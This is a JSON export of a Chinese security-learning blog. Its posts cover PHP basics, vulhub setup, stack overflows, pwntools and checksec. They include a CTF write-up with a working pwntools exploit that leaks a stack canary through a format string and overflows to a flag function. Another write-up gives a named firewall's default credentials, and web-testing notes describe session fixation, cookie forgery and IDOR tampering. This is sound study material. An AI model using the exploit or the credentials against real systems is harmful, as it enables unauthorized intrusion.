{"meta":{"title":"Sinky's Blog","subtitle":"","description":"","author":"Sinky","url":"https://sinky.top","root":"/"},"pages":[{"title":"Sinky's Blog","date":"2022-08-09T09:54:23.181Z","updated":"2022-08-09T09:54:23.181Z","comments":false,"path":"about/index.html","permalink":"https://sinky.top/about/index.html","excerpt":"","text":"联系方式v+:Sinky94674 关于我： 毕业后备考一年公务员失败了，但是这一年备考给我的心性一个很大的磨练，决定重新开始找工作，不考了，这一年无比怀念当初跟朋友一起打ctf一起学习的时光，现在希望能够把技术学回来，希望不止回归曾经的水平，还希望能够进步，也希望能够在九月前找到一份适合的工作，拥有新的伙伴和新的生活。 感恩过去的岁月成就了如今的我。"}],"posts":[{"title":"php学习2","slug":"php学习2","date":"2022-11-23T01:56:57.868Z","updated":"2022-11-23T05:55:53.085Z","comments":true,"path":"2022/11/23/php学习2/","link":"","permalink":"https://sinky.top/2022/11/23/php%E5%AD%A6%E4%B9%A02/","excerpt":"","text":"phpphp是一种运行在服务器端的脚本语言，可以嵌入到html中 php代码标记ASP标记： &lt;%php代码 %&gt; # 已弃用 短标记： &lt;?php代码?&gt; # 已弃用 脚本标记： &lt;script language=\"php\"&gt;php代码&lt;/script&gt; ---------------------- 例子： &lt;html&gt; &lt;body&gt; &lt;b&gt; &lt;script language=\"php\"&gt; //脚本标记 echo 'hello world'; &lt;/script&gt; &lt;/b&gt; &lt;/body&gt; &lt;/html&gt; ----------------------------- 标准标记（常用）： &lt;?php php代码?&gt; php注释行注释： // 块注释： /*…*/ 1234567&lt;?php//注释/* balbalabalaba*/echo \"Hello world!\";?&gt; 语句分隔符 ; php中标记结束符?&gt;有自带语句结束符效果，最后一行php代码可以没有语句结束符。 php中很多代码书写并不是嵌入到html中，而是单独存在，通常书写习惯中不建议使用标记结束符，php会自动从开始到最后全部认为是php代码。 变量","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"}]},{"title":"Kali安装vulhub","slug":"Kali安装vulhub","date":"2022-11-21T01:23:59.283Z","updated":"2022-11-24T01:55:50.473Z","comments":true,"path":"2022/11/21/Kali安装vulhub/","link":"","permalink":"https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/","excerpt":"","text":"再搭一个靶场，基于docker和docker-compose的漏洞环境集合。 安装docker切root用户： apt-get update #更新 apt-get install -y apt-transport-https ca-certificates #安装https协议、CA证书 apt install docker.io # 安装docker docker -v # 查看是否安装成功 systemctl start docker # 启动docker docker ps -a # 查看docker信息 安装pip和docker-composeapt-get install python3-pip # 安装pip pip3 install docker-compose # 安装docker-compose docker-compose -v # 查看版本信息 安装vulhubgit clone https://github.com/vulhub/vulhub.git # 下载vulhub cd vulhub ls cd rails/CVE-2019-5418 # 随便进入一个靶场 docker-compose up -d # 开启靶场环境 哦豁，失败，我就说我怎么可能搭建环境这么顺利。切换了root，就可以了，等了好一会儿开启 查看靶场启动环境 docker-compose ps -a查看该环境运行的端口 然后连接一下网址：http://kali的ip:端口/ 关闭环境：docker-compose down 重启docker： systemctl restart docker 关闭docker： systemctl stop docker systemctl stop docker.socket 查看docker运行时状态：systemctl status docker （这次搭建靶场顺利到不可思议！！！）","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://sinky.top/tags/docker/"},{"name":"vulhub","slug":"vulhub","permalink":"https://sinky.top/tags/vulhub/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"靶场：某防火墙默认口令","slug":"靶场：某防火墙默认口令","date":"2022-11-15T05:53:43.820Z","updated":"2022-11-22T08:51:27.884Z","comments":true,"path":"2022/11/15/靶场：某防火墙默认口令/","link":"","permalink":"https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/","excerpt":"","text":"背景介绍安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的WEB页面。 实训目标 掌握查看当前设备类型的方法； 了解网络（安全）设备的登录控制方式； 了解网络（安全）设备的默认口令获取方式； 了解当前型号防火墙的不同账户的区别； 了解在网络信息安全中的权限最小化、权限分离作用； 解题方向 找到防火墙的默认口令进行登录。 解题题目给了一个登录界面，我注意到题目标题：天清汉马，那就百度搜了一下天清汉马防火墙的默认账号密码 账号：useradmin 密码：venus.user 然后……就拿到key了！ KEY: mozhedf5bfbb87e52d81d6c658bda251 说实话这不值得我花三个币！！！ 拓展 防火墙防火墙是指设置在不同网络或网络安全域之间的一系列部件的组合，它可以通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护，在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效的监控了内部网和Internet之间的任何活动，保证了内部网络的安全。 防火墙，一个硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程序对内部系统的破坏，或者组织内部重要信息向外流出，有双向监督的功能。 防火墙的分类及原理包过滤技术包过滤技术是一种简单、有效的安全控制技术，它工作在网络层，通过在为网络间相互连接的设备上加载允许、禁止来自某些特定的源地址、目的地址、TCP端口号等规则，对通过设备的数据包进行检查，限制数据包进出内部网络 包过滤技术的优点是对用户透明，传输性能高，但由于安全控制层次在网络层、传输层，安全控制力度也只限于源地址、目的地址和端口号，因而只能进行较为初步的安全控制。 应用代理技术应用代理防火墙工作在OSI的第七层，它通过检查所有应用层的信息包，并将检查的内容信息放入决策过程，从而提高网络的安全性。 应用网关防火墙是通过打破客户机/服务器模式实现的。每个客户机/服务器通信需要两个二连接：从客户端到防火墙，从防火墙到服务器。 另外，每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务 所以，应用网关防火墙具有可伸缩性差的缺点。 状态检测技术状态检测防火墙工作在OSI的第二至四层，采用状态检测包过滤的技术，是传统包过滤功能扩展而来。状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝，这种技术提供了高度安全的解决方案，同事具有较好的适应性和扩展性。 状态检测防火墙基本保持了简单包过滤防火墙的优点，性能较好，同时在防火墙的核心部分建立状态连接表，维护了连接，将进出昂罗的数据当成一个个的时间来处理，主要特点是由于缺乏对应用层协议的深度检测功能，无法彻底识别数据包中大量的垃圾邮件、广告以及木马程序等。 完全内容检测技术完全内容检测技术防火墙综合状态检测与应用代理技术，并基于多层检测架构，把防病毒、内容过滤，应用识别等功能整合到防火墙中，还包括IPS功能，在网络边界实施OSI第七层的内容扫描，实现了实时在网络边缘部署病毒防护、内容过滤等应用层服务措施。 完全内容检测技术防火墙可以检测整个数据包内容，根据需要建立连接状态表，网络层保护强，应用层控制细等有点，但由于功能集成度高，对产品硬件要求较高 防火墙作用 保护脆弱的服务：过滤不安全服务，提高网络安全减少主机风险 控制对系统的访问 集中的安全管理：在防火墙定义的安全规则可以运行于整个内部网络系统，而无需在内部网每台机器上分别设立安全策略 增强的保密性：可以阻止攻击者获取攻击网络系统的有用信息 记录和统计网络利用数据以及非法使用数据 策略执行：提供了指定和执行网络安全策略的手段。","categories":[],"tags":[{"name":"墨者学院，靶场，防火墙","slug":"墨者学院，靶场，防火墙","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%8C%E9%9D%B6%E5%9C%BA%EF%BC%8C%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"栈溢出原理及利用学习","slug":"栈溢出原理及利用学习(待补充)","date":"2022-11-10T06:02:14.144Z","updated":"2022-11-22T08:51:27.880Z","comments":true,"path":"2022/11/10/栈溢出原理及利用学习(待补充)/","link":"","permalink":"https://sinky.top/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(%E5%BE%85%E8%A1%A5%E5%85%85)/","excerpt":"","text":"栈数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶 Push 将数据压入栈顶 Pop 将栈顶数据弹出 代码段：存放可执行程序的代码，可读不可写 数据段：存放程序中已经初始化的静态（全局）变量，可读写 bss段：存放程序中未初始化的静态（全局）变量，可读写 堆(heap)：存放动态分配的内容，需要程序员手动分配和释放 栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等，有系统自动分配和释放 函数调用栈栈增长方向：高-&gt;低 ESP: 栈指针，指向栈顶低地址 ESP: 基址指针，指向栈底高地址 EIP: 指令指针，存储即将执行的程序指令地址 函数调用约定函数调用约定是指当一个函数被调用时，函数的参数会被传递给被调用的函数和返回值会被返回给调用函数，函数的调用约定规定了执行过程中函数的调用者和被调用者之间如何传递参数以及如何恢复栈平衡。 常用的函数调用约定： __cdecl # C/C++默认方式，参数从右到左压栈，主调函数负责栈平衡 __stdcall # windows API默认方式，参数从右向左入栈，被调函数负责栈平衡 __fastcall # 快速调用方式，将参数有限从寄存器(ECX和EDX)传入，其余参数再从右向左从栈传入 thiscall # 从右向左入栈，若参数数目固定，则类实例的this指针通过ecx传递给被调函数，被调函数自身清理堆栈，若参数数目补丁，则this指针在所有参数入栈后再入栈，主调函数清理堆栈 pascal # 从左向右入栈，支支持固定参数的函数，类型和数量完全可知，被调函数自身清理堆栈，输出的函数名称五任何修饰且全部大写 naked call # 编译器不产生保存和恢复寄存器的代码，且不能用return返回返回值，该调用约定用于特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令 函数调用开始在调用一个函数时，系统会为函数分配一个栈帧，栈帧空间为该函数独有 调用者调用函数过程： 函数参数从右到左入栈 返回地址入栈 上一函数ebp入栈 balabala 在上一函数ebp入栈后，就开辟了被调函数的新栈帧，然后被调函数临时变量入栈。 （之前在一本书里学过，但是记得不那么清楚了） 函数调用结束函数调用结束，按照相反顺序将数据弹出栈： 弹出临时变量 弹出调用函数的ebp值，存入ebp寄存器中 弹出返回地址，存在eip寄存器中 返回地址即是用call指令调用函数时下一条指令的地址，存到eip中 栈溢出原理栈溢出是指向栈中写入超出限定长度的数据，一处的数据覆盖栈中其他数据，从而影响程序运行，当攻击者计算好溢出长度，编写一处数据，用我们想要的地址数据覆盖函数返回地址，那么被调函数调用完返回主函数时，就会跳转到我们覆盖的地址，通过改变程序流程，达到利用的目的。 调试举例栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。 栈溢出属于缓冲区溢出，指程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"漏洞","slug":"漏洞","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"PWN的exp编写学习记录(待学)","slug":"PWN的exp编写学习记录","date":"2022-11-10T05:32:42.447Z","updated":"2022-11-22T08:51:27.878Z","comments":true,"path":"2022/11/10/PWN的exp编写学习记录/","link":"","permalink":"https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://sinky.top/tags/PWN/"},{"name":"exp","slug":"exp","permalink":"https://sinky.top/tags/exp/"}]},{"title":"PWN常用脚本语句解释","slug":"PWN常用脚本语句解释","date":"2022-11-10T01:15:38.991Z","updated":"2022-11-22T08:51:27.876Z","comments":true,"path":"2022/11/10/PWN常用脚本语句解释/","link":"","permalink":"https://sinky.top/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/","excerpt":"","text":"接收远端传回的数据interactive(): 在取得shell之后使用，直接进行交互，相当于回到shell的模式 recv(numb=字节大小,timeout=default): 接收指定字节数 recvall(): 一直接收直到达到文件EOF recvline(keepends=True): 接收一行，keepends为是否保留行尾的\\n recvuntil(delims,drop=False): 一直读到delims的pattern出现为止 recvrepeat(timeout=default): 持续接收直到EOF或timeout 向远端发送数据send(data): 发送数据 sendline(data): 发送一行数据，相当于在数据末尾加\\n sendlineafter(\"字符串\",data): 在这一串字符串结束之后发送data sh.send(data): 进行数据发送，不一定是一行数据 send和sendline的区别是：sendline多发送了一次回车 from pwn import * # 将所用模块导入到当前namespace io=process('./pwn123') # 本地，与文件进行交互 使用了process，结尾要加interactive才能完成交互过程 r=remote(\"xx.xx.xx.xx(注：ip)\"，端口号) # 远程，连接指定IP及端口 关闭远程连接使用 sh.close() r.recvuntil(\"字符串\") # 运行到字符串位置停下 r.sendline(payload) # 发送payload context.log_level=\"debug\" # 脚本在执行时就会输出debug的信息，可以通过观察这些信息查找出错点 或者 contex(arch='amd64',os='linux',log_level='debug') gdb.attach(io) pause() # 对脚本进行调试 打包数据：p64()或p32() 解包数据：u64()或u32() bin文件操作： elf=ELF(\"binfilepath\") libc=ELF(\"libcpath\") 得到程序bss段的起始位置：bss_base_addr=elf.bss() PLT write_plt=elf.plt[\"write\"] GOT write_plt=elf.got[\"write\"]","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://sinky.top/tags/PWN/"}]},{"title":"pwn之checksec学习","slug":"pwn之checksec学习","date":"2022-11-08T08:37:25.377Z","updated":"2022-11-09T01:19:01.891Z","comments":true,"path":"2022/11/08/pwn之checksec学习/","link":"","permalink":"https://sinky.top/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！ checksec主要用于查看题目开启了哪些保护机制。 Arch程序架构信息，判断是64位还是32位 RELRO主要针对GOT改写的攻击方式，分为Partial RELRO和Full RELRO。 Partial RELRO：表示got表可写，容易受到攻击 Full RELRO：表示got表不可写，只读，无法被覆盖，会增加程序启动时间 Stack-canaryCanary翻译为金丝雀，应用于在栈保护上是在初始化一个栈帧时在栈底设置一个随机的canary值，当函数返回时监测canary是否改变，以此判断stack/buffer overflow是否发生，改变则说明栈溢出发生，程序走另一个流程结束一面漏洞利用成功，因此我们需要获取canary值或防止出发stack_chk_fall函数。 gcc -fno-stack-protector -o hello test.c //禁用栈保护 gcc -fstack-protector -o hello test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o hello test.c //启用堆栈保护，为所有函数插入保护代码 NXNX enable 可不执行内存 最常见方法为ROP,利用栈溢出在栈上布置地址，每个内存地址对应一个gadget，利用ret等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。 gcc默认开启NX选项。 这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过 PIE位置无关可执行文件，地址空间分布随机化 与ASLR类似，将程序运行时的对堆栈以及共享库的加载地址随机化，而PIE技术则在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定，在PIE和ASLR同时开启时攻击者将对程序的内存布局一无所知，got表方法也难以进行，无法获取程序.got表的虚地址。 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。 （据说除了新版checksec，但是我没安装呢）","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"},{"name":"checksec","slug":"checksec","permalink":"https://sinky.top/tags/checksec/"}]},{"title":"攻防世界-Mary_Morton","slug":"攻防世界-Mary_Morton","date":"2022-11-08T08:24:16.075Z","updated":"2022-11-10T05:30:42.846Z","comments":true,"path":"2022/11/08/攻防世界-Mary_Morton/","link":"","permalink":"https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/","excerpt":"","text":"9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！ 查文件 file查看文件属性，elf64位文件 checksec查看保护机制 64位文件； 开启了Partial RELRO，表示got表可写； 开启了NX，栈不可执行； 无PIE； 开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数返回之时会检测canary是否改变。 运行程序 1-栈溢出漏洞；2-格式化字符串漏洞；3-退出 IDA分析IDA打开找到main函数： 123456789101112131415161718192021222324252627282930void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int v3; // [sp+24h] [bp-Ch]@2 __int64 v4; // [sp+28h] [bp-8h]@1 v4 = *MK_FP(__FS__, 40LL); sub_4009FF(); puts(\"Welcome to the battle ! \"); puts(\"[Great Fairy] level pwned \"); puts(\"Select your weapon \"); while ( 1 ) { while ( 1 ) { sub_4009DA(); __isoc99_scanf(\"%d\", &amp;v3); // 选择项 1，2，3 if ( v3 != 2 ) break; sub_4008EB(); // printf 格式化字符串 } if ( v3 == 3 ) { puts(\"Bye \"); exit(0); } if ( v3 == 1 ) sub_400960(); // 触发canary，含栈溢出 else puts(\"Wrong!\"); }} 格式化字符串： 12345678910__int64 sub_4008EB(){ char buf; // [sp+0h] [bp-90h]@1 __int64 v2; // [sp+88h] [bp-8h]@1 v2 = *MK_FP(__FS__, 0x28LL); // 从位置FS:[0x28u]读取双字内容 memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x7FuLL); printf(&amp;buf, &amp;buf); return *MK_FP(__FS__, 40LL) ^ v2;} 栈溢出： 12345678910__int64 sub_400960(){ char buf; // [sp+0h] [bp-90h]@1 __int64 v2; // [sp+88h] [bp-8h]@1 v2 = *MK_FP(__FS__, 0x28LL); // canary标志 memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x100uLL); // 栈溢出 printf(\"-&gt; %s\\n\", &amp;buf); return *MK_FP(__FS__, 40LL) ^ v2;} 查看流程图： 分析可知v2 = *MK_FP(__FS__, 0x28LL);有canary保护，只有rax与fs:28h相等，才能跳转到返回值，反之则调用stak_chk_fail 查看字符串发现有 cat flag: 地址：0x4008DA 思路： 利用字符串漏洞泄露canary值，在函数返回的时候再填回去，然后利用栈溢出让其返回后门函数。 （我的IDA不知道为什么解析不出来这个函数体，不过应该问题不大） 解题先测一下字符串漏洞的偏移，payload一般为： AAAA-%x-%x-%x-%x… 偏移了6个字节。 canary与输入参数之间的偏移： 计算泄露特定地址的payload一般构造为 (target_addr - start_addr + offset) / address_bytes_length（64位为8，32位为4） buf和v2相差： 0x90-0x8=0x88,0x88/8=17,17+6=23 64位程序，一个字符占8字节（32位是4字节），所以buf和v2相差0x88，转十进制为136，除以8，即相差17个字节 由于buf是格式化字符串的第6个参数，所以v2是格式化字符串的第17+6=23个参数。 payload1234567891011121314151617181920212223from pwn import * # 导入pwn模块p=remote('61.147.171.105',53266) # 远程交互p.sendlineafter('3. Exit the battle','2') # 在接收到`3. Exit`后输入2进入格式化字符串漏洞环节p.sendline('%23$p') # 发送%23$p,让程序输出canary的值 (不明白为什么23位是这样写的)p.recvuntil('0x') # 读到0x出现为止canary=int(p.recv(16),16) # canary接收整型16字节数print \"canary: \" + hex(canary) # canary转十六进制flag_addr=0x4008dapayload='a'*0x88+p64(canary)+'a'*8+p64(flag_addr) # 用a填充相差的0x88，跟上第23位的canary值，加上flag地址，最后64位对其填上a*8p.sendlineafter('3. Exit the battle','1') # 读到3.Exit之后输入1 进入栈溢出环节p.sendline(payload) # 发送payloadp.interactive() # 结束交互 （题目描述说是非常简单的热身pwn，呵呵） 拓展：canary对于64位程序，在开始运行时，就会随机生成canary，存放在 TLS结构体 tcbhead_t 偏移为 0x28 的位置，带有缓冲区的函数在函数开头就会利于 FS指针 从该位置取出canary的值将其置于 rbp-0x8 的位置，在函数返回时，就会比较 FS[0x28] 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— stack_chk_fail,它会让程序终止并且抛出报错 “stack smahing detected” 拓展：格式化字符串漏洞虽然之前有写过笔记，但是忘记了，所以再记录一遍。 在C语言中的printf,fprintf,sprintf,snprintf等print函数等用到类似%形式的一个或多个说明符，例如printf(\"I am %s\",lihua); 第一个参数就是格式化字符串，它主要依靠一个可以用来告诉程序如何进行格式化输出的说明符。 漏洞原理原理就是程序员偷懒将格式化字符串操作全交给了用户，产生任意地址读写的漏洞。 正确的函数： char str[100]; scanf(\"%s\",str); printf(\"%s\",str); 有漏洞的函数： char str[100]; scanf(\"%s\",str); printf(str); 因为printf函数是可变参数的函数，如果用户输入参数位%x，那么就会输出内存中的数据，因为没有指定参数个数，没有限制输出类型，所以程序遇到%就会根据相应的规则去取相应的参数，直到检索到格式化字符串结束，造成内存泄露。","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://sinky.top/tags/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"Web攻防业务安全实战指南笔记","slug":"Web攻防业务安全实战指南","date":"2022-11-08T02:59:37.010Z","updated":"2022-11-08T03:06:09.894Z","comments":true,"path":"2022/11/08/Web攻防业务安全实战指南/","link":"","permalink":"https://sinky.top/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/","excerpt":"","text":"业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。 业务风险点识别应主要关注以下安全风险内容： 业务环节存在的安全风险：业务环节存在的安全风险指的是业务使用者课件的业务存在的安全风险，如注册、登录和密码找回等身份认真环节，是否存在完善的验证码机制、数据一致性校验机制、Session和Cookie校验机制等，是否能规避验证码绕过、暴力破解和Sql注入等漏洞。 支持系统存在的安全风险：支持系统存在的安全风险，如用户访问控制机制是否完善，是否存在水平越权或垂直越权漏洞。系统内加密存储机制是否完善，业务数据是否明文传输，系统使用的业务接口是否可以未授权访问/调用，是否可以调用重放、遍历，接口调用参数是否可篡改等。 业务环节间存在的安全风险：业务环节间存在的安全风险，如系统业务流程是否存在乱序，导致某个业务环节可绕过、回退，或某个业务请求可以无限重放。业务环节间传输的数据是否有一致性校验机制，是否存在业务数据可被篡改的风险。 支持系统间存在的安全风险：支持系统间存在的安全风险，如系统间数据传输是否加密、系统间传输的参数是否可篡改。系统间输入参数的过滤机制是否完善，是否可能导致sql注入、xss跨站脚本和代码执行漏洞。 业务环节与支持系统间存在的安全风险：业务环节与支持系统间存在的风险，如数据传输是否加密、加密方式是否完善，是否采用前端加密、简单md5编码等不安全的加密方式。系统处理多线程并发请求的机制是否完善，服务端逻辑与数据库读写是否存在时序问题，导致竞争条件漏洞，系统间输入参数的过滤机制是否完善。 技术篇登录认证模块测试暴力破解测试暴力破解测试是指针对应用系统用户登录账号与密码进行的穷举测试，针对账号或密码进行逐一比较，直到找出正确的账号密码。 在已知账号的情况下，加载密码字典针对密码进行穷举测试； 在未知账号的情况下，加载账号字典，并结合密码字典进行穷举测试。 在未知账号和密码的情况下，利用账号字典和密码字典进行穷举测试。 测试过程使用手工或工具对系统登录认证的账号及密码进行穷举访问测试，根据系统返回的数据信息来判别账号及密码是否正确。 对浏览器进行http代理配置，将浏览器访问请求指向bp工具默认的监听端口。 修复建议 增加验证码，登录失败一次，验证码变换一次。 配置登录失败次数限制策略，如在同一用户尝试登录的情况下，5分钟内连续登录失败超过6次，则禁止此用户在3小时内登录系统。 在条件允许的情况下，增加手机接收短信验证码或邮箱接收邮件验证码，实现双因素认证的防暴力破解机制。 ##本地加密传输测试本机加密传输测试是针对客户端与服务器的数据传输，查看数据是否采用ssl加密方式加密。###测试过程测试验证客户端与服务器交互数据在网络传输过程中是否采用ssl进行加密处理，加密数据是否可被破解。 修复建议在架设web应用的服务器上部署有效的ssl证书服务 Session测试测试原理和方法Session是应用系统对浏览器客户端身份认证的属性标识，在用户退出应用系统时，应将客户端Session认证属性标识清空。如果未能清空客户端Session标识，在下次登录系统时，系统会重复利用该Session标识进行认证会话。攻击者可利用该漏洞生成固定Session会话，并诱骗用户利用攻击者生成的固定会话进行系统登录，从而导致用户会话认证被窃取。 测试过程在注销退出系统时，对当前浏览器授权SessionID值进行记录，再次登录系统，将本次授权SessionID值与上次进行比对校验。判断服务器是否与上次相同的SessionID值进行授权认证，若使用相同SessionID值则存在固定会话风险。 在已登录授权认证的页面中退出系统 使用bp截取退出系统的请求数据，记录本次授权的SessionID 重新登录系统，bp截取登录授权请求数据，与上次的SessionID值比较判断是否相同 修复建议在客户端登录系统时，应首先判断客户端是否提交浏览器的留存Session认证会话属性标识，客户端提交此信息至服务器时，应及时销毁浏览器留存的Session认证会话，并要求客户端浏览器重新生成Session认证会话属性标识。 Session会话注销测试Session是应用系统对浏览器客户端身份认证的属性标识，在用户注销或退出应用系统时，系统应将客户端Session认证属性标识清空，如果未能清空Session认证会话，该认证会话，将持续有效，此时攻击者获得该Session认证会话会导致用户权限被盗取。 测试过程用户退出系统授权后，判断授权认证SessionID值是否依然有效，若授权认证SessionID依然有效则存在风险。 对已登录授权的系统页面使用Bp进行截取，保存SessionID值 将数据包发送到Repeater模块中 在已授权的页面中退出系统。 重发数据包，并查看系统是否对推出后得到用户授权Session今年解除授权。 修复建议在用户注销或退出应用系统时，服务器应及时销毁Session认证会话信息并清空客户端浏览器Session属性标识。 Session会话超时事件测试在用户成功登录系统获得Session认证会话，该Session认证会话应具有生命周期，即用户在成功登录系统后，在固定时间内该用户与服务器无任何交互操作，应销毁该用户Session认证会话信息，要求用户重新登录系统认证。 测试过程对系统会话授权认证时长进行测试，并根据系统承载的业务需求来分析判断当前系统会话授权认证时间是否过长。 对已登录授权的系统页面使用bp工具进行请求数据截取，将数据包中Session认证参数值进行保存记录。 发送到Repeater中，三十分钟后重发，看能否继续查阅信息 修复建议对每个生成的Session认证会话配置生命周期，从而有效降低因用户会话认证时间过长而导致的信息泄露风险。 Cookie仿冒测试服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在cookie中，并发送至客户端存储。攻击者通过尝试修改cookie中的身份标识，从而达到仿冒其他用户身份的目的，并拥有相关用户的所有权限。 测试对系统会话授权认证cookie中会话身份认证标识进行篡改测试，通过篡改身份认证标识值来判断能否改变用户身份会话。 使用李雷账号登录系统并进行浏览器页面刷新 使用bp对本次页面刷新请求数据进行截取，并将请求数据cookie中的userid值修改为admin进行提交。 查看提交后的返回信息，账号身份授权被修改成管理员 修复建议建议对客户端标识的用户敏感信息数据，使用Session会话认证方式，避免被他人仿冒身份 密文比对认证测试在系统登录时密码加密流程一般是先将用户名和密码发送到服务器，服务器会把用户提交的密码经过hash算法加密后和数据库中存储的加密值比对，如果加密值相同，则判定用户提交密码正确。 但有些网站系统的流程是在前台浏览器客户端对密码进行hash加密后传输给服务器并与数据库加密值进行对比，如果加密值相同，则判定用户提交密码正确，此流程会泄露密码加密方式导致出现安全隐患。 测试过程对系统敏感数据加密流程进行测试，判断加密过程或方式是否为客户端加密方式。 bp抓包，根据页面代码分析后证实登录传输口令使用Hash MD5加密算法加密 bp抓包，查看web系统登录提交密码为加密后的密文传输 通过对页面代码分析得出web系统登录口令加密处理过程是由本地js脚本来完成，方式为md5。 用bp爆破，添加配置项payloadProcessing，将要破解的密码值进行数据处理转换。 修复建议将密码加密过程及密文比对过程防止在服务器后台执行，发送用户名和密码到服务器后台，后台对用户提交的密码经过md5算法加密后和数据库中存储的md5密码值进行比对，如果加密值相同，则允许用户登录 登录失败信息测试在用户登录系统失败时，系统会在页面显示用户登录失败信息，若提交账号在系统中不存在，系统提示“用户名不存”、“账号不存在”等明确信息，假如提交账号在系统中存在，则系统提示“密码错误”等间接提示信息，攻击者可根据此类登录失败提示信息来判断当前登录账号是否在系统中存在，从而进行有针对性的暴力破解口令测试 修复建议对系统登录失败提示语句表达内容进行统一的模糊描述，从而提高攻击者对登录系统用户名及密码的可猜测难度。 业务办理模块测试订单ID篡改测试开发人员没考虑登录后用户间权限间隔问题，就会导致水平越权。 测试过程登录李先生账号，查看本人保单，抓包修改保单号，即可越权查看他人保单内容。 在返回的数据包中，包含全部在界面中被隐藏的身份证号等敏感信息。 修复建议后台查看订单时要通过Session机制判断用户身份，做好平行权限控制，服务端需要校验相应订单是否和登录者身份一致，防止水平越权泄露用户敏感个人信息。 手机号码篡改测试手机号通常可以代表一个用户身份，当请求中发现有手机号参数时，我们可以试着修改它，测试是否存在越权漏洞，系统登录功能一般先判断用户名和密码是否正确，通过Session机制赋予用户令牌，但是在登录后的某些操作某些功能时，抓包或通过其他方式尝试篡改手机号，即可对此类问题进行测试。 测试过程登录后在操作某些功能时抓包，篡改手机号进行测试。 以尾号0136手机号登录，选择挂失业务。 抓包修改手机号为另一个手机号尾号9793 手机号码参数篡改成功，成功挂失尾号9793 